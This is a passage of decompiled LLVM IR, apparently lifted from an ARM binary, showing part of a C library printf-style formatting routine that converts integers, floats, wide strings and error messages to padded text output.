  br i1 %v7_12ce0, label %bb140, label %dec_label_pc_12c0c

bb140:                                            ; preds = %dec_label_pc_12c00
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_12c18

dec_label_pc_12c0c:                               ; preds = %dec_label_pc_12c00
  br i1 %v7_12c2c, label %dec_label_pc_12c1c, label %dec_label_pc_12c18

dec_label_pc_12c18:                               ; preds = %.thread84, %bb140, %dec_label_pc_12c0c
  %v0_12c4486 = phi i32 [ %v5_12bf8, %.thread84 ], [ %v4_12bcc, %bb140 ], [ %v4_12bcc, %dec_label_pc_12c0c ]
  br label %dec_label_pc_12c1c

dec_label_pc_12c1c:                               ; preds = %dec_label_pc_12c0c, %dec_label_pc_12c18
  %v0_12c4485 = phi i32 [ %v0_12c4486, %dec_label_pc_12c18 ], [ %v4_12bcc, %dec_label_pc_12c0c ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_12c18 ], [ 6, %dec_label_pc_12c0c ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_12c1c = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_12c1c, i32* %r3.global-to-local, align 4
  %v1_12c20 = icmp slt i32 %v3_12c1c, 0
  %v7_12c24. = select i1 %v1_12c20, i32 %v7_12c24, i32 32
  store i32 %v7_12c24., i32* @sb, align 4
  br i1 %v7_12c2c, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_12c1c
  store i32 %v2_12b78, i32* @lr, align 4
  %v2_12c34 = load i32, i32* %ip.global-to-local, align 4
  %v5_12c34 = mul i32 %v2_12c34, 4
  %v6_12c34 = add i32 %v5_12c34, %v2_12b78
  store i32 %v6_12c34, i32* %r3.global-to-local, align 4
  %v2_12c38 = add i32 %v6_12c34, -260
  %v3_12c38 = inttoptr i32 %v2_12c38 to i32*
  %v4_12c38 = load i32, i32* %v3_12c38, align 4
  store i32 %v4_12c38, i32* %r3.global-to-local, align 4
  %v2_12c40 = and i32 %v4_12c38, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_12c1c, %.thread16
  %storemerge94 = phi i32 [ %v2_12c40, %.thread16 ], [ 1024, %dec_label_pc_12c1c ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_12c4485, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_12c4c = call i32 @_load_inttype()
  %v0_12c50 = load i32, i32* @r1, align 4
  store i32 %v0_12c50, i32* %r2.global-to-local, align 4
  %v0_12c5c = load i32, i32* @r4, align 4
  store i32 %v0_12c5c, i32* %r3.global-to-local, align 4
  store i32 %v2_12c60, i32* %r0.global-to-local, align 4
  %v0_12c64 = load i32, i32* @r5, align 4
  %v6_12c68 = call i32 @_uintmaxtostr(i8* %v5_12c68, i32 %v0_12c4c, i32 %v0_12c50, i32 %v0_12c5c, i32 %v0_12c64)
  store i32 %v6_12c68, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_12c68, i32* @r6, align 4
  br i1 %v3_12c78, label %bb148, label %dec_label_pc_12c7c

dec_label_pc_12c7c:                               ; preds = %bb145
  %v7_12c68 = inttoptr i32 %v6_12c68 to i8*
  %v3_12c7c = load i8, i8* %v7_12c68, align 1
  %v7_12c80 = icmp eq i8 %v3_12c7c, 45
  %v2_12c88 = or i32 %v0_12bec, 2
  %v2_12c88.stack_var_-316.4 = select i1 %v7_12c80, i32 %v2_12c88, i32 %v0_12bec
  store i32 %v2_12c88.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_12c80, label %.thread18, label %dec_label_pc_12c9c

.thread18:                                        ; preds = %dec_label_pc_12c7c
  %v3_12c8c = add i32 %v6_12c68, 1
  store i32 %v3_12c8c, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_12c9c:                               ; preds = %dec_label_pc_12c7c
  %v1_12c9c = and i32 %v2_12c88.stack_var_-316.4, 2
  %v2_12c9c = icmp eq i32 %v1_12c9c, 0
  br i1 %v2_12c9c, label %dec_label_pc_12ca8, label %bb146

bb146:                                            ; preds = %dec_label_pc_12c9c
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_12ca8:                               ; preds = %dec_label_pc_12c9c
  %v1_12ca8 = urem i32 %v2_12c88.stack_var_-316.4, 2
  %v2_12ca8 = icmp eq i32 %v1_12ca8, 0
  br i1 %v2_12ca8, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_12ca8
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_12ca8, %bb147
  %v0_12d04 = phi i32 [ %v6_12c68, %bb145 ], [ %v3_12c8c, %.thread18 ], [ %v6_12c68, %dec_label_pc_12ca8 ], [ %v6_12c68, %bb147 ], [ %v6_12c68, %bb146 ]
  %v0_12cc0 = phi i32 [ %v0_12bec, %bb145 ], [ %v2_12c88, %.thread18 ], [ %v0_12bec, %dec_label_pc_12ca8 ], [ %v0_12bec, %bb147 ], [ %v0_12bec, %bb146 ]
  %v3_12cb0 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_12cb0, i32* %r2.global-to-local, align 4
  store i32 %v0_12cc0, i32* %r3.global-to-local, align 4
  %v1_12cb8 = icmp slt i32 %v3_12cb0, 0
  br i1 %v1_12cb8, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_12ce8 = phi i32 [ %v3_12cb0, %bb148 ], [ 1, %bb149 ]
  %v1_12cc0 = and i32 %v0_12cc0, 16
  %v2_12cc0 = icmp eq i32 %v1_12cc0, 0
  store i32 %v2_12e94, i32* %r3.global-to-local, align 4
  %v2_12cc8 = sub i32 %v2_12e94, %v0_12d04
  %v1_12ccc = add i32 %v2_12cc8, 127
  store i32 %v1_12ccc, i32* @r5, align 4
  br i1 %v2_12cc0, label %bb157, label %dec_label_pc_12cd4

dec_label_pc_12cd4:                               ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_12cd4
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_12cd4, %bb151
  br i1 %v7_12ce0, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_12ce8, %v1_12ccc
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_12cec, label %dec_label_pc_12cf4, label %bb157

dec_label_pc_12cf4:                               ; preds = %bb155
  %v1_12cf4 = inttoptr i32 %v0_12d04 to i8*
  %v2_12cf4 = load i8, i8* %v1_12cf4, align 1
  %v3_12cf4 = zext i8 %v2_12cf4 to i32
  store i32 %v3_12cf4, i32* %r3.global-to-local, align 4
  %v7_12cf8 = icmp eq i8 %v2_12cf4, 48
  br i1 %v7_12cf8, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_12cf4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_12cf4
  %v2_12d00 = add i32 %v2_12cc8, 128
  store i32 %v2_12d00, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_12d3c = phi i32 [ %v0_12ce8, %bb155 ], [ %v0_12ce8, %bb150 ], [ 1, %bb156 ], [ %v2_12d00, %.thread25 ], [ %v0_12ce8, %bb154 ]
  %v1_12d04 = inttoptr i32 %v0_12d04 to i8*
  %v2_12d04 = load i8, i8* %v1_12d04, align 1
  %v3_12d04 = zext i8 %v2_12d04 to i32
  store i32 %v3_12d04, i32* %r3.global-to-local, align 4
  %v7_12d08 = icmp eq i8 %v2_12d04, 48
  br i1 %v7_12d08, label %dec_label_pc_12d10, label %dec_label_pc_12d38

dec_label_pc_12d10:                               ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_12d14 = load i32, i32* @r7, align 4
  %v7_12d18 = icmp slt i32 %v0_12d14, 6
  br i1 %v7_12d18, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_12d10
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_12d10, %bb158
  br i1 %v7_12c2c, label %.thread26, label %dec_label_pc_12d2c

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_232b0.1046 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_12eac

dec_label_pc_12d2c:                               ; preds = %bb159
  %v2_12d2c = icmp eq i32 %v5_12d3c, 0
  br i1 %v2_12d2c, label %bb160, label %dec_label_pc_12d38

bb160:                                            ; preds = %dec_label_pc_12d2c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12eac

dec_label_pc_12d38:                               ; preds = %dec_label_pc_12d2c, %bb157
  %v2_12d38 = sub i32 %v5_12d3c, %v1_12ccc
  %tmp199 = icmp ugt i32 %v5_12d3c, %v1_12ccc
  br i1 %tmp199, label %.thread90, label %dec_label_pc_12eac

.thread90:                                        ; preds = %dec_label_pc_12d38
  store i32 %v2_12d38, i32* @r4, align 4
  br label %dec_label_pc_12ec8thread-pre-split

dec_label_pc_12d48:                               ; preds = %dec_label_pc_12bbc
  br i1 %tmp196, label %dec_label_pc_12d84, label %dec_label_pc_12d50

dec_label_pc_12d50:                               ; preds = %dec_label_pc_12d48
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_12d5c = load i32, i32* @fp, align 4
  store i32 %v0_12d5c, i32* %r0.global-to-local, align 4
  %v2_12d60 = load i32, i32* %v1_12ba4, align 4
  %v5_12d60 = load i32, i32* %v4_12d60, align 4
  store i32 %v5_12d60, i32* %r2.global-to-local, align 4
  store i32 %v2_12d64, i32* %r3.global-to-local, align 4
  %v6_12d68 = call i32 @_fpmaxtostr(i32 %v0_12d5c, i32 %v2_12d60, i32 %v5_12d60, i32* nonnull %stack_var_-328, i32 76232)
  store i32 %v6_12d68, i32* %r0.global-to-local, align 4
  %v1_12d6c = icmp slt i32 %v6_12d68, 0
  br i1 %v1_12d6c, label %dec_label_pc_13018, label %dec_label_pc_12d74

dec_label_pc_12d74:                               ; preds = %dec_label_pc_12d50
  %v2_12d78 = add i32 %v6_12d68, %stack_var_-336.2
  store i32 %v2_12d78, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13004

dec_label_pc_12d84:                               ; preds = %dec_label_pc_12d48
  br i1 %v3_12d88, label %dec_label_pc_12e24, label %dec_label_pc_12d8c

dec_label_pc_12d8c:                               ; preds = %dec_label_pc_12d84
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_12d84, label %dec_label_pc_12d9c, label %dec_label_pc_12dec

dec_label_pc_12d9c:                               ; preds = %dec_label_pc_12d8c
  %v2_12d9c = load i32, i32* %v1_12ba4, align 4
  store i32 %v2_12d9c, i32* %r3.global-to-local, align 4
  %v9_12da0 = icmp eq i32 %v2_12d9c, 0
  store i32 %v2_12d9c, i32* %stack_var_-44, align 4
  br i1 %v9_12da0, label %dec_label_pc_12eb4, label %dec_label_pc_12dac

dec_label_pc_12dac:                               ; preds = %dec_label_pc_12d9c
  %v3_12dac = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_12dac, i32* %r3.global-to-local, align 4
  store i32 %v2_12db0, i32* @r0, align 4
  %v5_12dbc = icmp slt i32 %v3_12dac, -1
  br i1 %v5_12dbc, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_12dac
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_12dac, %bb161
  %storemerge193 = phi i32 [ %v3_12dac, %bb161 ], [ -1, %dec_label_pc_12dac ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_12db0, i32* @r1, align 4
  store i32 %v2_12dc4, i32* %r3.global-to-local, align 4
  %v0_12dc8 = call i32 @__GI_wcsrtombs()
  store i32 %v0_12dc8, i32* %r0.global-to-local, align 4
  %v7_12dcc = icmp eq i32 %v0_12dc8, -1
  store i32 %v0_12dc8, i32* @r5, align 4
  br i1 %v7_12dcc, label %dec_label_pc_13018, label %dec_label_pc_12dd8

dec_label_pc_12dd8:                               ; preds = %bb162
  %v0_12dd8 = load i32, i32* @sl, align 4
  store i32 %v0_12dd8, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_12dd8, i32* @r6, align 4
  br label %dec_label_pc_12ec8

dec_label_pc_12dec:                               ; preds = %dec_label_pc_12d8c
  store i32 %v2_12e94, i32* %r8.global-to-local, align 4
  %v2_12df0 = load i32, i32* %v1_12ba4, align 4
  store i32 %v2_12dc4, i32* %r2.global-to-local, align 4
  store i32 %v2_12e94, i32* %r0.global-to-local, align 4
  %v3_12dfc = call i32 @__GI_wcrtomb(i32 %v2_12e94, i32 %v2_12df0, i32 %v2_12dc4)
  store i32 %v3_12dfc, i32* %r0.global-to-local, align 4
  %v7_12e00 = icmp eq i32 %v3_12dfc, -1
  store i32 %v3_12dfc, i32* @r5, align 4
  br i1 %v7_12e00, label %dec_label_pc_13018, label %dec_label_pc_12e0c

dec_label_pc_12e0c:                               ; preds = %dec_label_pc_12dec
  %v0_12e0c = load i32, i32* @sl, align 4
  store i32 %v0_12e0c, i32* @r4, align 4
  store i32 %v2_12e94, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_12e1c = trunc i32 %v0_12e0c to i8
  %v2_12e1c = load i32, i32* %r8.global-to-local, align 4
  %v4_12e1c = add i32 %v2_12e1c, %v3_12dfc
  %v5_12e1c = inttoptr i32 %v4_12e1c to i8*
  store i8 %v1_12e1c, i8* %v5_12e1c, align 1
  %v0_12ecc.pre.pre = load i32, i32* @r5, align 4
  %v1_12ecc.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12ec8thread-pre-split

dec_label_pc_12e24:                               ; preds = %dec_label_pc_12d84
  br i1 %v3_12e28, label %dec_label_pc_12e88, label %dec_label_pc_12e2c

dec_label_pc_12e2c:                               ; preds = %dec_label_pc_12e24
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_12e34 = load i32, i32* %v1_12ba4, align 4
  br i1 %v7_12e24, label %dec_label_pc_12e34, label %dec_label_pc_12e60

dec_label_pc_12e34:                               ; preds = %dec_label_pc_12e2c
  store i32 %v2_12e34, i32* @r6, align 4
  %v2_12e38 = icmp eq i32 %v2_12e34, 0
  br i1 %v2_12e38, label %dec_label_pc_12eb4, label %dec_label_pc_12e40

dec_label_pc_12e40:                               ; preds = %dec_label_pc_12e34, %dec_label_pc_12e90
  %v0_12e50 = phi i32 [ %v2_12e34, %dec_label_pc_12e34 ], [ %v3_12ea0, %dec_label_pc_12e90 ]
  %v3_12e40 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_12e40, i32* %r3.global-to-local, align 4
  %v5_12e4c = icmp slt i32 %v3_12e40, -1
  br i1 %v5_12e4c, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_12e40
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_12e40, %bb163
  %storemerge194 = phi i32 [ %v3_12e40, %bb163 ], [ -1, %dec_label_pc_12e40 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_12e50, i32* %r0.global-to-local, align 4
  %v1_12e54 = inttoptr i32 %v0_12e50 to i8*
  %v2_12e54 = call i32 @strnlen(i8* %v1_12e54)
  store i32 %v2_12e54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12ebc

dec_label_pc_12e60:                               ; preds = %dec_label_pc_12e2c
  store i32 %v2_12e34, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_12e94, i32* @r6, align 4
  store i32 %v2_12e34, i32* %stack_var_-180, align 4
  br label %dec_label_pc_12ec8thread-pre-split

dec_label_pc_12e88:                               ; preds = %dec_label_pc_12e24
  br i1 %v7_12e88, label %dec_label_pc_12e90, label %dec_label_pc_13018

dec_label_pc_12e90:                               ; preds = %dec_label_pc_12e88
  %v0_12e90 = call i32 @__errno_location()
  store i32 %v0_12e90, i32* %r0.global-to-local, align 4
  %v1_12e98 = inttoptr i32 %v0_12e90 to i32*
  %v2_12e98 = load i32, i32* %v1_12e98, align 4
  store i32 %v2_12e98, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_12ea0 = call i32 @__GI___glibc_strerror_r(i32 %v2_12e98, i32 %v2_12e94, i32 128)
  store i32 %v3_12ea0, i32* %r0.global-to-local, align 4
  store i32 %v3_12ea0, i32* @r6, align 4
  br label %dec_label_pc_12e40

dec_label_pc_12eac:                               ; preds = %dec_label_pc_12d38, %.thread26, %bb160
  %v0_12ecc.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_12ccc, %dec_label_pc_12d38 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12ec8thread-pre-split

dec_label_pc_12eb4:                               ; preds = %dec_label_pc_12e34, %dec_label_pc_12d9c
  store i32 ptrtoint ([7 x i8]* @global_var_232b8.1049 to i32), i32* @r6, align 4
  br label %dec_label_pc_12ebc

dec_label_pc_12ebc:                               ; preds = %bb164, %dec_label_pc_12eb4
  %storemerge = phi i32 [ 6, %dec_label_pc_12eb4 ], [ %v2_12e54, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_12ec8

dec_label_pc_12ec8thread-pre-split:               ; preds = %.thread90, %dec_label_pc_12e0c, %dec_label_pc_12e60, %dec_label_pc_12eac
  %v1_12ecc.pre = phi i32 [ 0, %dec_label_pc_12eac ], [ %v1_12ecc.pre.pre, %dec_label_pc_12e0c ], [ 0, %dec_label_pc_12e60 ], [ %v2_12d38, %.thread90 ]
  %v0_12ecc.pre = phi i32 [ %v0_12ecc.pre81, %dec_label_pc_12eac ], [ %v0_12ecc.pre.pre, %dec_label_pc_12e0c ], [ 1, %dec_label_pc_12e60 ], [ %v1_12ccc, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_12cc0, %dec_label_pc_12eac ], [ %v0_12bec, %dec_label_pc_12e0c ], [ %v0_12bec, %dec_label_pc_12e60 ], [ %v0_12cc0, %.thread90 ]
  %v0_12ec8.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_12ec8

dec_label_pc_12ec8:                               ; preds = %dec_label_pc_12ec8thread-pre-split, %dec_label_pc_12dd8, %dec_label_pc_12ebc
  %v1_12f08 = phi i32 [ %v1_12ecc.pre, %dec_label_pc_12ec8thread-pre-split ], [ %v0_12dd8, %dec_label_pc_12dd8 ], [ 0, %dec_label_pc_12ebc ]
  %v0_12ecc = phi i32 [ %v0_12ecc.pre, %dec_label_pc_12ec8thread-pre-split ], [ %v0_12dc8, %dec_label_pc_12dd8 ], [ %storemerge, %dec_label_pc_12ebc ]
  %v0_12ed4 = phi i32 [ %v0_12ec8.pr, %dec_label_pc_12ec8thread-pre-split ], [ 11, %dec_label_pc_12dd8 ], [ 11, %dec_label_pc_12ebc ]
  %v0_12f10 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_12ec8thread-pre-split ], [ %v0_12bec, %dec_label_pc_12dd8 ], [ %v0_12bec, %dec_label_pc_12ebc ]
  %v7_12ec8 = icmp eq i32 %v0_12ed4, 11
  %v2_12ecc = add i32 %v0_12ecc, %v1_12f08
  br i1 %v7_12ec8, label %dec_label_pc_12ee4, label %bb165

bb165:                                            ; preds = %dec_label_pc_12ec8
  %v7_12edc = icmp sgt i32 %v0_12ed4, 5
  %. = select i1 %v7_12edc, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_12ee0 = add i32 %., %v2_12ecc
  br label %dec_label_pc_12ee4

dec_label_pc_12ee4:                               ; preds = %dec_label_pc_12ec8, %bb165
  %v0_12ef8 = phi i32 [ %v2_12ecc, %dec_label_pc_12ec8 ], [ %v2_12ee0, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_12ee8 = sub i32 %tmp97, %v0_12ef8
  %v3_12ee8 = icmp uge i32 %tmp97, %v0_12ef8
  %v9_12ee8 = icmp eq i32 %tmp97, %v0_12ef8
  %v2_12eec = xor i1 %v3_12ee8, true
  %v3_12eec = or i1 %v9_12ee8, %v2_12eec
  br i1 %v3_12eec, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_12ee4
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_12ee4, %bb166
  %v2_12ef0 = xor i1 %v9_12ee8, true
  %v3_12ef0 = and i1 %v3_12ee8, %v2_12ef0
  br i1 %v3_12ef0, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_12ef8.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_12ee8, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_12f08 = phi i32 [ %v1_12ef8.pre, %._crit_edge ], [ %v2_12ee8, %bb168 ]
  %v2_12ef8 = add i32 %v0_12ef8, %stack_var_-336.2
  %v2_12efc = add i32 %v2_12ef8, %v2_12f08
  store i32 %v2_12efc, i32* %ip.global-to-local, align 4
  store i32 %v0_12f10, i32* %r3.global-to-local, align 4
  %v0_12f04 = load i32, i32* @sb, align 4
  %v7_12f04 = icmp eq i32 %v0_12f04, 48
  br i1 %v7_12f04, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_12f08 = add i32 %v2_12f08, %v1_12f08
  store i32 %v3_12f08, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_12f24 = phi i32 [ %v2_12f08, %bb169 ], [ 0, %bb170 ]
  %v1_12f10 = and i32 %v0_12f10, 8
  store i32 %v1_12f10, i32* @r8, align 4
  %v2_12f10 = icmp eq i32 %v1_12f10, 0
  br i1 %v2_12f10, label %dec_label_pc_12f1c, label %dec_label_pc_12f38

dec_label_pc_12f1c:                               ; preds = %.thread29
  %v0_12f1c = load i32, i32* @fp, align 4
  store i32 %v0_12f1c, i32* %r0.global-to-local, align 4
  store i32 %v0_12f24, i32* %r2.global-to-local, align 4
  %v4_12f28 = call i32 @_charpad(i32 %v0_12f1c, i8 32, i32 %v0_12f24)
  store i32 %v4_12f28, i32* %r0.global-to-local, align 4
  %v1_12f2c = load i32, i32* @sl, align 4
  %v9_12f2c = icmp eq i32 %v4_12f28, %v1_12f2c
  br i1 %v9_12f2c, label %dec_label_pc_12f34, label %dec_label_pc_13018

dec_label_pc_12f34:                               ; preds = %dec_label_pc_12f1c
  %v0_12f34 = load i32, i32* @r8, align 4
  store i32 %v0_12f34, i32* @sl, align 4
  %v0_12f40.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12f38

dec_label_pc_12f38:                               ; preds = %.thread29, %dec_label_pc_12f34
  %v0_12f40 = phi i32 [ %v0_12ed4, %.thread29 ], [ %v0_12f40.pre, %dec_label_pc_12f34 ]
  %v0_12f3c = load i32, i32* @fp, align 4
  %v2_12f40 = add i32 %v0_12f40, ptrtoint (i32* @global_var_232c0.1051 to i32)
  store i32 %v2_12f40, i32* %r0.global-to-local, align 4
  %v2_12f44 = inttoptr i32 %v2_12f40 to i8*
  %v3_12f44 = call i32 @__GI_fputs_unlocked(i8* %v2_12f44, i32 %v0_12f3c)
  %v0_12f48 = load i32, i32* @fp, align 4
  store i32 %v0_12f48, i32* %r0.global-to-local, align 4
  %v0_12f50 = load i32, i32* @r4, align 4
  store i32 %v0_12f50, i32* %r2.global-to-local, align 4
  %v4_12f54 = call i32 @_charpad(i32 %v0_12f48, i8 48, i32 %v0_12f50)
  store i32 %v4_12f54, i32* %r0.global-to-local, align 4
  %v1_12f58 = load i32, i32* @r4, align 4
  %v9_12f58 = icmp eq i32 %v4_12f54, %v1_12f58
  br i1 %v9_12f58, label %dec_label_pc_12f60, label %dec_label_pc_13018

dec_label_pc_12f60:                               ; preds = %dec_label_pc_12f38
  %v3_12f60 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_12f60, i32* %r3.global-to-local, align 4
  %v2_12f64 = icmp eq i32 %v3_12f60, 0
  br i1 %v2_12f64, label %dec_label_pc_12f74, label %dec_label_pc_12fd4thread-pre-split

dec_label_pc_12f74:                               ; preds = %dec_label_pc_12f60
  %v0_12f74 = load i32, i32* @r5, align 4
  %v2_12f74 = icmp eq i32 %v0_12f74, 0
  br i1 %v2_12f74, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_12f74
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_12f74
  %v1_12f7c = load i32, i32* @r6, align 4
  store i32 %v1_12f7c, i32* %r0.global-to-local, align 4
  %v1_12f84 = load i32, i32* @fp, align 4
  store i32 %v1_12f84, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 77708, i32* @lr, align 4
  %v1_12f88 = xor i1 %v2_12f74, true
  call void @__pseudo_cond_branch(i1 %v1_12f88, i32 ptrtoint (i32* @global_var_16774.1042 to i32))
  %v0_12f8c = load i32, i32* %r0.global-to-local, align 4
  %v1_12f8c = load i32, i32* @r5, align 4
  %v9_12f8c = icmp eq i32 %v0_12f8c, %v1_12f8c
  br i1 %v9_12f8c, label %dec_label_pc_12fec, label %dec_label_pc_13018

dec_label_pc_12f98:                               ; preds = %dec_label_pc_12fd4
  %v2_12f98 = icmp ult i32 %v1_12f9c, 128
  %.v1_12f9c = select i1 %v2_12f98, i32 %v1_12f9c, i32 128
  store i32 %.v1_12f9c, i32* @r2, align 4
  %v0_12fa4 = call i32 @__GI_wcsrtombs()
  store i32 %v0_12fa4, i32* @r4, align 4
  %v2_12fa8 = icmp eq i32 %v0_12fa4, 0
  store i32 %v0_12fa4, i32* %r3.global-to-local, align 4
  store i32 %v2_12e94, i32* %r0.global-to-local, align 4
  %v0_12fb8 = load i32, i32* @fp, align 4
  store i32 %v0_12fb8, i32* %r2.global-to-local, align 4
  br i1 %v2_12fa8, label %dec_label_pc_12fc8, label %dec_label_pc_12fc0

dec_label_pc_12fc0:                               ; preds = %dec_label_pc_12f98
  %v3_12fc0 = call i32 @__stdio_fwrite(i32 %v2_12e94, i32 %v0_12fa4, i32 %v0_12fb8)
  store i32 %v3_12fc0, i32* %r0.global-to-local, align 4
  store i32 %v3_12fc0, i32* %r3.global-to-local, align 4
  %v1_12fc8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12fc8

dec_label_pc_12fc8:                               ; preds = %dec_label_pc_12f98, %dec_label_pc_12fc0
  %v1_12fc8 = phi i32 [ 0, %dec_label_pc_12f98 ], [ %v1_12fc8.pre, %dec_label_pc_12fc0 ]
  %v0_12fcc = phi i32 [ 0, %dec_label_pc_12f98 ], [ %v3_12fc0, %dec_label_pc_12fc0 ]
  %v9_12fc8 = icmp eq i32 %v0_12fcc, %v1_12fc8
  %v1_12fcc = load i32, i32* @r5, align 4
  %v2_12fcc = sub i32 %v1_12fcc, %v0_12fcc
  store i32 %v2_12fcc, i32* @r5, align 4
  br i1 %v9_12fc8, label %dec_label_pc_12fd4, label %dec_label_pc_13018

dec_label_pc_12fd4thread-pre-split:               ; preds = %dec_label_pc_12f60
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_12fd8.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_12fd4

dec_label_pc_12fd4:                               ; preds = %dec_label_pc_12fd4thread-pre-split, %dec_label_pc_12fc8
  %v1_12f9c = phi i32 [ %v0_12fd8.pr, %dec_label_pc_12fd4thread-pre-split ], [ %v2_12fcc, %dec_label_pc_12fc8 ]
  store i32 %v2_12e94, i32* @r6, align 4
  %v2_12fd8 = icmp eq i32 %v1_12f9c, 0
  store i32 %v2_12db0, i32* @r1, align 4
  store i32 %v2_12dc4, i32* %r3.global-to-local, align 4
  store i32 %v2_12e94, i32* @r0, align 4
  br i1 %v2_12fd8, label %dec_label_pc_12fec, label %dec_label_pc_12f98

dec_label_pc_12fec:                               ; preds = %dec_label_pc_12fd4, %.thread36
  %v0_12fec = load i32, i32* @fp, align 4
  store i32 %v0_12fec, i32* %r0.global-to-local, align 4
  %v0_12ff4 = load i32, i32* @sl, align 4
  store i32 %v0_12ff4, i32* %r2.global-to-local, align 4
  %v4_12ff8 = call i32 @_charpad(i32 %v0_12fec, i8 32, i32 %v0_12ff4)
  store i32 %v4_12ff8, i32* %r0.global-to-local, align 4
  %v1_12ffc = load i32, i32* @sl, align 4
  %v9_12ffc = icmp eq i32 %v4_12ff8, %v1_12ffc
  br i1 %v9_12ffc, label %dec_label_pc_13004, label %dec_label_pc_13018

dec_label_pc_13004:                               ; preds = %dec_label_pc_12fec, %dec_label_pc_12d74, %dec_label_pc_12b98
